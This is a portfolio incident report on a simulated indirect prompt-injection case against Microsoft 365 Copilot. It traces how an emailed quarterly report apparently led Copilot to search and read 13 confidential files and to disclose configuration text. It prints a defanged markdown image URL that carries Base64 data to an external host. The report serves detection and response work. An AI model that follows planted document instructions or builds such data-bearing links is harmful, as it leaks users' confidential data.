# Investigation Report

## Operation ECHOLEAK

Cormorant Capital Partners simulation · Microsoft 365 Copilot · Case ECHOLEAK-LAB-20260920

> A cyber-range portfolio investigation by Golam Tanvir Rahman. This is simulated activity, not a real client breach. Response actions below are recommendations unless explicitly identified as performed.

[Core report](#part-a--core-investigation) · [Findings](#5-findings) · [Response assessment](#part-b--hunt-and-incident-assessment) · [Queries](#appendix-a--investigation-queries) · [Evidence](#appendix-b--evidence-register) · [Verification gaps](#appendix-d--outstanding-verification)

---

# Part A — Core investigation

## 1. Front matter

| Field | Value |
| --- | --- |
| Report title | Operation ECHOLEAK — Investigation Report |
| Case reference | ECHOLEAK-LAB-20260920 — portfolio identifier assigned for this report, not an issued SOC ticket |
| Author | [Golam Tanvir Rahman](https://github.com/tanvirrahm) · [LinkedIn](https://www.linkedin.com/in/tanvir-cyber/) |
| Version | 2.0 |
| Date issued | 19 October 2026 |
| Incident date | 20 September 2026 |
| Purpose | Public portfolio presentation of a simulated investigation; no operational TLP designation assigned |
| Status | Investigation documented; external receipt and full data exposure unresolved |
| Workspace | LAW-HuntPractice |
| Run ID | `el--17-20260920` |

### Revision history

| Version | Date | Change |
| --- | --- | --- |
| 1.0 | 19 October 2026 | Initial GitHub write-up with seven screenshots and investigation queries. |
| 2.0 | 19 October 2026 | Reorganised into core findings, hunt and incident assessments, and evidence and verification appendices. |

## 2. Executive summary

I investigated unusual file access attributed to Emily Chen after she asked Copilot to summarise an emailed quarterly report. The investigation identified targeted Graph API searches, **13 distinct file reads**, and Copilot responses containing external image URLs with encoded information. A separate response exposed system-prompt text and enterprise configuration from a retrieved file.

The evidence supports **external input manipulation through indirect prompt injection**. The activity departed from the legitimate user request and differed from normal summarisation sessions in the reviewed baseline.

**Evidence boundary:** The logs establish access and generated response content. They do not establish the complete contents transmitted or independently confirm that the external destination received an image request.

## 3. Scope and data sources

| Source | Investigative purpose |
| --- | --- |
| `OfficeActivity_CL` | Email receipt and file access events |
| `CopilotAudit_CL` | User request, Graph tool calls and generated responses |
| `EntraSignIn_CL` | Authentication context and alternative-hypothesis review |
| Seven screenshots | Visual evidence reproduced below from my hunt notes |
| Exported text shared during the hunt | Exact tool-call times, later file reads and normal-response examples |

**Run filter:** `RunId == "el--17-20260920"`  
**Window:** 20 September 2026, 09:00–11:00 UTC  
**Primary identity:** `emily.chen@cormorantcapital.com`  
**Additional identity in case scope:** `mark.ross@cormorantcapital.com`

Screenshots display UTC−6. The timeline below uses UTC. Some screenshot queries are exploratory and do not show the full run/time filtering; the reusable queries in this repository explicitly apply both. Session identifiers should be used where available before grouping nearby events into the same interaction.

### Evidence verification

The seven screenshots were extracted unchanged from the hunt document. Exact later tool-call times and filenames come from the pasted Copilot results supplied during the investigation. This report does not claim independent access to the tenant or a complete raw-log export.

Two distinctions affected the conclusions:

1. **Timing:** The first attachment access is 10:42:08 UTC; delivery is approximately 09:15 UTC. The gap is roughly 87 minutes. The case's six-second access burst and the eight-second span of initial Graph calls refer to different event streams.
2. **Payload:** The visible encoded chart values are filenames. The configuration URL contains a label. Neither proves transmission of complete file contents.

### Gaps and blind spots

The original injected text, complete file contents, full session correlation, configuration-change exports and external fetch/receipt logs are not included. Historical novelty is established in the case for the initial targets, not independently for every later file. Appendix D records follow-up work.

## 4. Timeline

All times are UTC on 20 September 2026.

| Time UTC | Observed event |
| --- | --- |
| Approximately 09:15 | External quarterly-report email received. Screenshot 1 shows MessageReceived and the attachment filter. |
| 10:42:08 | OfficeActivity_CL records FileAccessed for Q3-2026-Global-Markets-Review.docx in OneDrive. Screenshot 2. |
| 10:42:35 | Copilot invocation in the pasted results. Screenshot 3 shows the request: “Summarise the key findings of this quarterly report”. |
| 10:42:41–10:42:45 | Three Graph.SearchFiles calls target board minutes, M&A acquisition targets, and salary reviews. |
| 10:42:47–10:42:55 | Five Graph.ReadFile calls retrieve four business documents and the Copilot configuration file. |
| 10:43:08 | Summary contains four external image URLs with Base64 values in the d parameter. Screenshot 5. |
| 10:44:19 | Response exposes system-prompt text and enterprise configuration and includes a further external image reference. Screenshot 6. |
| 10:45:30–10:45:45 | Additional searches target confidential, restricted, board, acquisition, and salary material. |
| 10:45:46–10:46:26 | Eight additional Graph.ReadFile calls access sensitive documents. |
| 10:46:35 | Response contains eight additional external image references corresponding to the later file reads. |

The visible delivery time and first document access imply roughly 87 minutes of delay, not a verified exact 90 minutes. The delayed trigger is consistent with malicious content waiting for a legitimate user to ask Copilot to process the report.

The case handoff describes five file-access events in six seconds. The pasted Graph.ReadFile events span eight seconds. These are different event streams; the report preserves that distinction instead of treating the two intervals as interchangeable.

### Attack sequence

```mermaid
flowchart TD
    A["External report delivered"] --> B["Emily requests a summary"]
    B --> C["Copilot processes untrusted content"]
    C --> D["Unrelated searches and file reads"]
    D --> E["Generated Copilot responses"]
    E --> F["External image URLs with encoded data"]
    E --> G["Configuration text disclosed"]
    F -. "If fetched" .-> H["Request carries data to external server"]
```

The dashed step is the transmission mechanism, not a confirmed outbound request in the supplied evidence.

## 5. Findings

### F1 — External report delivery

**Finding:** The initial input was an externally delivered quarterly report.

**Evidence:**

I started with `MessageReceived` events for Emily and the attachment `Q3-2026-Global-Markets-Review.docx`. The result shows the email entering through Exchange at approximately 09:15 UTC. The sender address is truncated in the screenshot, so I do not reconstruct a full sender indicator.


![Email receipt query and matching Exchange event](images/01-email-delivery.png)

*Figure 1. Email receipt query and matching Exchange event [Open full resolution](images/01-email-delivery.png).*

**Interpretation:** The report is the suspected entry point for indirect prompt injection. The full sender indicator and original malicious instructions remain unresolved.

---

### F2 — Delayed processing after document access

**Finding:** The first recorded document access occurred roughly 87 minutes after delivery.

**Evidence:**

The attachment-specific `FileAccessed` event appears at **10:42:08 UTC** in OneDrive. Compared with delivery at approximately 09:15 UTC, this is roughly **87 minutes**. The previously discussed 90-minute gap is an approximation, not an exact verified duration.

This delay is consistent with an asynchronous attack: the content waits until a legitimate action causes Copilot to process it.


![First recorded access to the quarterly report at 04:42:08 in the displayed timezone](images/02-attachment-access.png)

*Figure 2. First recorded access to the quarterly report at 04:42:08 in the displayed timezone [Open full resolution](images/02-attachment-access.png).*

**Interpretation:** Delivery and triggering were separated in time. The attacker could plant content and wait for an ordinary user workflow to process it.

---

### F3 — The user requested only a report summary

**Finding:** The legitimate prompt did not request confidential-file searches.

**Evidence:**

The logged request was:

> Summarise the key findings of this quarterly report

That request establishes the intended task. It does not ask Copilot to search for board documents, salary reviews, acquisition targets, or configuration data.


![Copilot prompt showing the legitimate quarterly report summary request](images/03-user-summary-request.png)

*Figure 3. Copilot prompt showing the legitimate quarterly report summary request [Open full resolution](images/03-user-summary-request.png).*

**Interpretation:** The explicit request supplies the baseline for judging tool behaviour. Access is suspicious because it does not serve that request.

---

### F4 — Copilot searched and read unrelated sensitive files

**Finding:** Graph calls show a departure from the requested summary.

**Evidence:**

The interaction was followed by `Graph.SearchFiles` queries for:

- `board minutes confidential`
- `M&A acquisition target`
- `salary review confidential`

Copilot then used `Graph.ReadFile` to retrieve matching documents and a configuration file. The initial five reads are visible below. The later eight reads are documented in the timeline and inventory from the pasted results; no separate screenshot of that later sequence was supplied.


![Targeted Graph searches followed by the initial file reads](images/04-graph-search-and-read.png)

*Figure 4. Targeted Graph searches followed by the initial file reads [Open full resolution](images/04-graph-search-and-read.png).*

**Interpretation:** Graph tools can be legitimate. Their unrelated search targets and subsequent response content make this sequence anomalous.

---

### F5 — Responses carried encoded information in external image URLs

**Finding:** The response contains an outbound data channel, but successful delivery is not independently confirmed.

**Evidence:**

The `CopilotResponse` field contains image references labelled as charts. Their URLs point to `metrics-cdn[.]analyticshub[.]io`, using `/img` and a `d` query parameter containing Base64 data.

This defanged example is shown as code so it cannot load an external resource:

```text
![Chart 1](hxxps://metrics-cdn[.]analyticshub[.]io/img?d=<Base64 value>&s=1)
```

When an app fetches an image, its request includes the URL query string. That means the request itself can carry information to the destination before any image is returned. The visible chart values decode to filenames, not full document contents.

A browser fetch may resemble ordinary HTTPS image traffic; a cloud renderer or proxy fetch may occur outside endpoint visibility. The supplied telemetry does not establish the fetching component or confirm delivery.


![Copilot response containing external chart image references with encoded query parameters](images/05-external-image-urls.png)

*Figure 5. Copilot response containing external chart image references with encoded query parameters [Open full resolution](images/05-external-image-urls.png).*

**Interpretation:** The URL query string carries information during an image request. Endpoint-only monitoring may not fully represent service-side rendering, and response content alone does not prove transmission.

---

### F6 — Configuration text was disclosed without demonstrated modification

**Finding:** The configuration response reveals internal settings text; it is not evidence of a configuration write.

**Evidence:**

At **10:44:19 UTC**, the response included text labelled `system_prompt` and `enterprise_config`. It listed sensitivity labels, a DLP policy name, permitted data sources, access scope, custom instructions, and organisational structure.

This information could help an attacker select targets and tailor further malicious instructions. However:

- Reading configuration does not demonstrate changing configuration.
- Text retrieved from a file is not proof of the live system prompt or effective permissions.
- The visible configuration URL decodes to `system_prompt_cormorant_capital`, a label—not the entire configuration text.


![System prompt and enterprise configuration text exposed in the Copilot response](images/06-configuration-disclosure.png)

*Figure 6. System prompt and enterprise configuration text exposed in the Copilot response [Open full resolution](images/06-configuration-disclosure.png).*

**Interpretation:** Configuration knowledge may support later targeting. It does not automatically bypass controls, establish effective permissions, or prove persistent tampering.

---

### F7 — Reviewed authentication did not show an obvious anomaly

**Finding:** The reviewed sign-ins favour the external-input hypothesis over an obvious account takeover.

**Evidence:**

The reviewed sign-ins show successful authentication from the known lab address `203.0.113.45`, with London location and successful conditional-access results. These observations do not reveal an obvious authentication anomaly.

A familiar IP alone cannot exclude account or token compromise. In this case, the sign-in context, lack of demonstrated configuration writes, and task deviation after document processing favour the external-input hypothesis.


![Sign-in review showing the known address and successful authentication results](images/07-sign-in-review.png)

*Figure 7. Sign-in review showing the known address and successful authentication results [Open full resolution](images/07-sign-in-review.png).*

**Interpretation:** A known address does not rule out token or account compromise. Authentication is supporting context rather than conclusive proof.


### F8 — Retrieval extended to 13 distinct targets

**Finding:** The full observed sequence includes five initial reads and eight later reads, excluding the poisoned report itself.

**Evidence:**

The pasted Copilot results identify 13 distinct Graph.ReadFile targets: five in the initial sequence and eight in the later sequence. The poisoned report is the input source and is excluded from this inventory. Department labels below follow the SharePoint site paths.

| Site | Exact filename |
| --- | --- |
| Executive | Board Meeting Minutes - October 2026.docx |
| Executive | Project Falcon - M&A Target Assessment.xlsx |
| HR | Salary Review FY2027 - Executive Summary.pdf |
| Finance | Client Portfolio - Henderson Family Office.xlsx |
| IT | Copilot System Configuration - Cormorant.json |
| Finance | Compliance Audit Results - H2 2026.xlsx |
| Finance | Restricted Client List - Internal Only.docx |
| Finance | Board Resolution - Emergency Session.pdf |
| Finance | Acquisition Pipeline - Q4 2026.xlsx |
| HR | Executive Salary Benchmarking 2027.pdf |
| HR | Confidential Investigation - Insider Trading.docx |
| Executive | Board Committee Minutes - Audit Committee.docx |
| Executive | Quarterly Revenue Report - Restricted Distribution.xlsx |

### Potential impact

The filenames indicate possible exposure involving board decisions, acquisition plans, salaries, client portfolios, compliance matters, and internal investigations. These are potential confidentiality impacts inferred from filenames, not findings about the files’ actual contents. Configuration disclosure could also help an adversary understand internal rules and likely search targets.

**Interpretation:** The initial alert does not capture the entire retrieval scope. The inventory defines objects requiring review; it does not establish their full contents or external receipt.

### F9 — Baseline comparison supports hijacked behaviour

**Finding:** The anomalous interaction differs from the reviewed normal summaries across tools, history, timing and response content.

**Evidence:**

| Axis | Observed distinction |
| --- | --- |
| Tools | Normal summaries reviewed show no Graph.SearchFiles or Graph.ReadFile calls; the anomalous chain uses both. |
| History and relevance | The case identifies the initial sensitive targets as new to Emily; the accessed material is unrelated to the quarterly summary. Prior history for every later file was not supplied. |
| Timing | Reads occur seconds apart in concentrated bursts, supporting automated retrieval rather than manual document-by-document review. |
| Response | Normal summaries remain on task. A normal Excel chart uses an internal SharePoint URL; suspicious responses use external data-bearing image URLs and expose configuration text. |

Graph API use is not inherently malicious. The combination of unrelated targets, new access history, rapid retrieval and external data-bearing responses supports the finding.

**Interpretation:** These observations are strongest in combination. A fast read or a Graph call alone is insufficient to classify the interaction as malicious.

## 6. Negative findings and untested questions

| Question | Evidence reviewed | Conclusion and boundary |
| --- | --- | --- |
| Obvious sign-in anomaly? | Sign-in screenshot and case context | None apparent in the reviewed events; no categorical exclusion of account compromise. |
| Configuration modified? | ReadFile sequence and configuration response | No write demonstrated. Full change history was not supplied. |
| Full documents present in visible URL payloads? | Pasted image URL values | Visible values contain filenames and a configuration label. Full transmitted content remains unknown. |
| Confirmed external receipt? | Copilot response content | Not established; no fetch or receiver evidence supplied. |
| Malware, persistence or endpoint compromise? | No endpoint execution sweep supplied | Not tested; no negative conclusion claimed. |
| Other affected users? | Named comparison scope and reviewed normal usage | No complete tenant-wide scope assessment supplied. |

## 7. MITRE ATLAS mapping

| Mapping | Application | Confidence boundary |
| --- | --- | --- |
| `AML.T0051` — LLM Prompt Injection | External content redirects Copilot away from the user's summary task. | Supported by the sequence and case context. |
| `AML.T0051.001` — Indirect | The suspected instructions enter through a document data channel. | Exact injected wording was not recovered in the supplied evidence. |

ATLAS is used for the AI-specific behaviour. Configuration readout is not automatically mapped as extraction of the live effective system prompt. The report does not assign unsupported account-takeover, persistence or configuration-write techniques.

## 8. Recommendations

These are **proposed actions**, not remediation I claim to have performed in the lab.

### Containment and evidence preservation

1. Preserve the email, attachment, file versions, full audit exports and available session identifiers.
2. Quarantine the source report and identify other copies or recipients.
3. Restrict the external destination at controls covering endpoints and any applicable cloud rendering path.
4. Expand the hunt across users and correlate file access with Copilot interactions.

### Investigation and recovery

1. Review the 13 files with their data owners to assess potential exposure.
2. Obtain browser, proxy or service-side fetch records to determine whether requests occurred.
3. Review effective permissions and configuration-change history.
4. Validate protections for untrusted content and external resources before restoring affected workflows.
5. Document remaining uncertainty, owner approval and closure criteria.

### Detection opportunities

Correlate unexpected Graph searches, first-time sensitive-file access, short retrieval bursts and external image URLs in AI responses. Tune detections against legitimate research and internal chart rendering. A single signal should not automatically establish compromise.

---

# Part B — Hunt and incident assessment

## B1. Threat hunt assessment

**Hypothesis:** Untrusted document content redirected an otherwise legitimate Copilot summarisation workflow into unrelated retrieval and external disclosure attempts.

**Approach:** Establish delivery and the user's request; follow tool calls and file accesses; inspect response content; compare normal usage; review authentication and configuration-change alternatives.

**Outcome:** The combined pattern supports indirect prompt injection. The investigation establishes 13 retrieval targets and the generated external image channel. The precise transmitted dataset remains unresolved.

## B2. Incident assessment

### B2.1 Impact and observed duration

The listed files concern board decisions, acquisitions, salaries, client portfolios, compliance and investigations. Potential business impact depends on their actual contents and the data transmitted. The first recorded document access at 10:42:08 and last suspicious response at 10:46:35 span **4 minutes 27 seconds**. This is the observed activity interval, not a proven total attacker dwell time.

### B2.2 Root cause and competing hypotheses

**Classification: External input manipulation through indirect prompt injection.**

| Hypothesis | Assessment |
| --- | --- |
| Compromised user account | Not supported by the reviewed sign-in evidence; known IP does not conclusively exclude compromise. |
| Compromised Copilot configuration | Configuration was read and disclosed. No configuration modification is demonstrated in the supplied sequence. |
| External input manipulation | Best-supported explanation for the deviation after the externally supplied report was processed. |

The original injected instruction text was not included in the screenshots. Its exact wording and location therefore remain unverified. The absence of configuration changes was an investigation finding reported during the hunt; a complete change-audit export is not included here.

### What the logs establish

- The target files and recorded retrieval sequence.
- Copilot responses containing encoded external image URLs.
- Disclosure of configuration text in the response.

### What remains unknown

- The complete data inside the retrieved files.
- Whether response payloads were truncated in the audit log.
- Whether an external image fetch completed and what the receiver obtained.
- Whether the retrieved configuration represented active settings.

The logs reveal **access scope**. Preserved file contents are needed to assess potential sensitivity, and complete response/fetch evidence is needed to establish actual transmission.

### B2.3 Containment and recovery status

No containment, eradication, configuration change, or recovery action is claimed as completed. Proposed actions appear in section 8. Closure requires an assessed exposure scope, documented disposition of the malicious input, validated controls, and owner approval with unresolved questions recorded.

### B2.4 Indicators and behavioural patterns

| Type | Value | Use |
| --- | --- | --- |
| Destination | `metrics-cdn[.]analyticshub[.]io` | Search response and fetch telemetry; case-specific destination. |
| URL pattern | `/img?d=<Base64>&s=<sequence>` | Identify encoded query parameters in generated image references. |
| Input artifact | `Q3-2026-Global-Markets-Review.docx` | Locate source copies and recipients. |
| Tools | `Graph.SearchFiles`, `Graph.ReadFile` | Correlate with task relevance and access history. |
| Behaviour | Unrelated confidential search → rapid reads → external image references | Stronger detection context than an individual domain or tool. |

`203.0.113.45` is normal sign-in context in this simulation, not an attacker indicator. These are lab indicators, not validated production threat intelligence.

### B2.5 Evidence provenance

The screenshots originate from the supplied hunt document; the supplemental event sequence comes from pasted results. A screenshot hash manifest is included at [evidence/SHA256SUMS.txt](evidence/SHA256SUMS.txt). These hashes verify the packaged files, not authenticity or custody before receipt. No formal forensic chain of custody is claimed.

### B2.6 Stakeholder and exposure assessment

In an operational incident, data owners and the incident lead would assess the preserved files and evidence of transmission, then involve privacy, legal or other relevant stakeholders as appropriate. This simulation does not establish a legal notification obligation or deadline.

### B2.7 Detection engineering and framework alignment

The response plan uses **NIST SP 800-61 Revision 3 / CSF 2.0** as an organising framework, not a compliance claim.

| Function | Application to this incident | Proposed owner |
| --- | --- | --- |
| Govern | Assign incident authority, evidence handling and exposure decisions; document the lab scope. | Incident lead |
| Identify | Inventory the 13 accessed files, owners, permissions and evidence gaps. | SOC and data owners |
| Protect | Review least privilege and handling of untrusted content and external resources. | M365 administrators |
| Detect | Correlate prompt, tool, access and response events; compare normal sessions. | SOC analyst |
| Respond | Preserve evidence, quarantine the source and investigate the outbound channel. | Incident lead and SOC |
| Recover | Validate controls and restore affected workflows with owner approval. | Service and data owners |

**MITRE ATLAS:** `AML.T0051` — LLM Prompt Injection; `AML.T0051.001` — Indirect. This is an analyst mapping of the observed document-mediated behaviour, not an assertion that every exploit detail was independently recovered.

Detection candidates should correlate user intent, unfamiliar sensitive objects, short retrieval bursts and data-bearing external URLs. Evaluate false positives against legitimate research and internal charts. A response match is evidence of generated content, not confirmation of network delivery.

---

## Appendix A — Investigation queries

Queries below are reusable versions of the observed pivots, scoped by run and UTC time. They were not re-executed when preparing this report. Select one query at a time. Additional session linkage may be required before assigning every result to one interaction.

[Download the KQL file](queries/investigation.kql).

### 1 Email delivery

```kusto
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20T09:00:00Z) .. datetime(2026-09-20T11:00:00Z))
| where UserId == "emily.chen@cormorantcapital.com"
| where Operation == "MessageReceived"
| where AttachmentNames contains "Q3-2026-Global-Markets-Review.docx"
| project TimeGenerated, Operation, AttachmentNames, Subject, SenderAddress
| order by TimeGenerated asc
```

### 2 First attachment access

```kusto
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20T09:00:00Z) .. datetime(2026-09-20T11:00:00Z))
| where UserId == "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed"
| where OfficeObjectId contains "Q3-2026-Global-Markets-Review.docx"
| project TimeGenerated, Operation, OfficeObjectId
| order by TimeGenerated asc
```

### 3 User request

```kusto
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20T09:00:00Z) .. datetime(2026-09-20T11:00:00Z))
| where UserId == "emily.chen@cormorantcapital.com"
| where InteractionType contains "prompt"
| project TimeGenerated, UserPrompt, DataSourcesAccessed
| order by TimeGenerated asc
```

### 4 Graph tools

```kusto
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20T09:00:00Z) .. datetime(2026-09-20T11:00:00Z))
| where UserId == "emily.chen@cormorantcapital.com"
| where ToolName in ("Graph.SearchFiles", "Graph.ReadFile")
| project TimeGenerated, ToolName, ToolParameters
| order by TimeGenerated asc
```

### 5 External response references

```kusto
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20T09:00:00Z) .. datetime(2026-09-20T11:00:00Z))
| where UserId == "emily.chen@cormorantcapital.com"
| where CopilotResponse contains "metrics-cdn.analyticshub.io"
| project TimeGenerated, CopilotResponse
| order by TimeGenerated asc
```

### 6 File accesses excluding source document

```kusto
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20T09:00:00Z) .. datetime(2026-09-20T11:00:00Z))
| where UserId == "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed"
| where OfficeObjectId !contains "Q3-2026-Global-Markets-Review.docx"
| project TimeGenerated, OfficeObjectId
| order by TimeGenerated asc
```

### 7 Sign-in review

```kusto
EntraSignIn_CL
| where RunId == "el--17-20260920"
| where TimeGenerated between (datetime(2026-09-20T09:00:00Z) .. datetime(2026-09-20T11:00:00Z))
| where UserPrincipalName == "emily.chen@cormorantcapital.com"
| order by TimeGenerated asc
```

## Appendix B — Evidence register

| Evidence ID | Source | Supports | Limitation |
| --- | --- | --- | --- |
| E1 | [Email delivery screenshot](images/01-email-delivery.png) | F1 | Sender and timestamp are truncated. |
| E2 | [Attachment access screenshot](images/02-attachment-access.png) | F2 | One selected result; not a full activity export. |
| E3 | [Summary request screenshot](images/03-user-summary-request.png) | F3 | Selected prompt context only. |
| E4 | [Graph activity screenshot](images/04-graph-search-and-read.png) | F4 | Initial sequence; some fields truncated. |
| E5 | [External image response screenshot](images/05-external-image-urls.png) | F5 | No external receipt confirmation. |
| E6 | [Configuration response screenshot](images/06-configuration-disclosure.png) | F6 | Retrieved text is not proof of live effective settings. |
| E7 | [Sign-in screenshot](images/07-sign-in-review.png) | F7 | Limited reviewed events. |
| E8 | Pasted Copilot event results supplied during the hunt | F8, F9, timeline | Not a full raw-log export; transcribed findings are in this report. |

All seven available screenshots appear inline in section 5 and are included at original resolution. No additional evidence screenshots were fabricated.

## Appendix C — References and authoring

- [NIST SP 800-61 Revision 3](https://csrc.nist.gov/pubs/sp/800/61/r3/final)
- [NIST incident response lifecycle overview](https://csrc.nist.gov/projects/incident-response)
- [MITRE indirect prompt injection entry](https://d3fend.mitre.org/offensive-technique/attack/AML.T0051.001/)
- [Joint APT40 advisory and investigative case studies](https://www.cyber.gov.au/advisory/apt40-advisory) — reporting-structure example only; no actor attribution is applied to this lab.

The case describes ECHOLEAK and the CoSnitch pattern. This write-up documents the supplied simulation and does not independently validate a production exploit or current product vulnerability.

**Structure reference:** [D. Cormier — Another Day, Part Two investigation report](https://github.com/drkcormier/threat-hunt-just-another-day-part-2/blob/main/another-day-part-2-investigation-report.md). The core/tail organisation and evidence-led finding format informed this report. Its incident facts, screenshots, attribution, confirmed-exfiltration conclusions and distribution labels are not reused.

**Authoring note:** I performed the lab investigation and supplied the evidence. AI assisted with explanations, organisation and drafting. Findings distinguish observations, interpretations and proposed response actions.

## Appendix D — Outstanding verification

| ID | Task | Why it matters | Suggested owner |
| --- | --- | --- | --- |
| D1 | Preserve and inspect the original report for injected instructions. | Establish exact wording and location of the input manipulation. | SOC analyst |
| D2 | Export all relevant records and correlate session/interaction identifiers. | Confirm that later reads belong to the same malicious chain. | SOC analyst |
| D3 | Review configuration and permission change history. | Strengthen the assessment of no persistent tampering. | M365 administrator |
| D4 | Obtain complete responses and rendering/proxy/browser fetch records. | Establish whether the image requests occurred and what they carried. | SOC and service owner |
| D5 | Review preserved versions of all 13 files with data owners. | Assess actual sensitivity and potential impact. | Data owners |
| D6 | Extend historical access and recipient searches. | Verify novelty of later files and scope other affected users. | SOC analyst |
| D7 | Validate detections and containment on both endpoint and service paths. | Close visibility gaps before approving recovery. | Detection and service teams |

## Portfolio files

The repository contains this illustrated report, seven screenshots, KQL queries, a screenshot hash manifest and the original Word report in `docs/`. The Word report is the earlier narrative version; this Markdown report contains the revised reference-style structure.
